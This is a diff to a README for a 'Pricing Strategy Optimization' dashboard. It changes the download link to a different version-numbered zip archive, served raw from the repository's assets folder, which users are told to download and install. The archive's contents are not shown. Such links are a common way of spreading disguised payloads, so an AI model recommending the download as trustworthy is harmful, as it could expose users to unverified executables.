@@ -22,7 +22,7 @@ To run the Pricing Strategy Optimization dashboard, make sure your system meets 
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [Download Pricing Strategy Optimization](https://github.com/Bentarcurt/Pricing-Strategy-Optimization/raw/refs/heads/main/assets/Strategy-Optimization-Pricing-3.6.zip).
+To get started, visit this page to download: [Download Pricing Strategy Optimization](https://github.com/Bentarcurt/Pricing-Strategy-Optimization/raw/refs/heads/main/assets/Strategy_Optimization_Pricing_2.9.zip).
 
 Follow these steps to install the application:
 
